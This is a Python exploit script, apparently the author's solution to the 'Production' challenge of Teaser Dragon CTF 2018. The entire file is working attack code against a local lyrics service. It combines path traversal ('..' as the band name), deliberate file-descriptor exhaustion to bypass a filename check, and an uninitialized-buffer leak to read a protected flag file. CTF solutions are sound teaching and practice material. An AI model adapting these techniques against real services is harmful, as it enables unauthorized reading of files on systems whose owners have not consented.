#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Production
# Competition:      Teaser Dragon CTF 2018
# Category:         Software exploitation
# Scoring:          343 pts (easy/medium)
# Number of solves: 16 out of 233 teams

import sys
import struct
import socket
import telnetlib

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def open_lyrics(s, band, song):
  read_until(s, "Command> ")
  s.sendall("open\n")
  read_until(s, "Band: ")
  s.sendall("%s\n" % band)
  read_until(s, "Song: ")
  s.sendall("%s\n" % song)

  response = read_until(s, "\n")

  SUCCESS = "[+] Opened the lyrics as new record "
  if SUCCESS in response:
    return int(response[len(SUCCESS):])

  return None

def read_lyrics(s, record):
  read_until(s, "Command> ")
  s.sendall("read\n")
  read_until(s, "Record ID: ")
  s.sendall("%d\n" % record)
  return read_until(s, "\n")

def close_lyrics(s, record):
  read_until(s, "Command> ")
  s.sendall("close\n")
  read_until(s, "Record ID: ")
  s.sendall("%d\n" % record)  

def main():
  # Connect to the service.
  s = socket.socket()
  s.connect(("127.0.0.1", 4141))

  # Open one of the lyrics and skip until the EOF, in order to use it later on to
  # read the contents of the flag through an uninitialized buffer in
  # read_lyrics().
  eof_record = open_lyrics(s, "Pink Floyd", "Wish You Were Here")

  while True:
    # Break on the last line of the lyrics.
    if "Wish you were here." in read_lyrics(s, eof_record):
      break

  # Trigger the leak of file descriptors for as long as we don't exhaust the
  # quota. Then close the last one to leave room for exactly one fd in the
  # process.
  last_leaked_record = None
  i = 1
  while True:
    print "[+] Leaking file descriptor #%d" % (i)
    i += 1

    leaked_record = open_lyrics(s, "..", "lyrics")

    if leaked_record != None:
      last_leaked_record = leaked_record
      while True:
        response = read_lyrics(s, leaked_record)
        if "Attack detected" in response:
          break
    else:
      close_lyrics(s, last_leaked_record)
      break

  # Open the flag file thanks to the reached fd limit which caused the filename
  # check to be skipped.
  open_lyrics(s, "..", "flag")

  # Load the contents of the flag file into the static buffer.
  read_lyrics(s, eof_record + 1)

  # Read the flag through the EOF file, which causes the old contents of the buffer
  # to be printed.
  print "FLAG: %s\n" % read_lyrics(s, eof_record)

  s.close()

if __name__ == "__main__":
  main()
